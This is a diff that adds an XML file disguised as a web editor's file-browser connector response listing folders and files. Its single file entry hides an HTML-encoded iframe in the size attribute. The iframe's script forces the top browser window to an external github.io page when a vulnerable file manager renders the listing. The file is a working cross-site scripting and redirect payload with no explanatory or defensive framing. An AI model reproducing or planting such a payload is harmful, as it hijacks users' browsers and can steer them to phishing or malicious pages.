@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Connector command="GetFoldersAndFiles" resourceType="File">
+    <CurrentFolder path="/" url="https://riopehrips.github.io/con/uploads/" />
+    <Error number="0" />
+    <Folders></Folders>
+    <Files>
+        <File name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=&apos;https://riopehrips.github.io/con/uploads/default.html&apos;;&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="" />
+    </Files>
+</Connector>
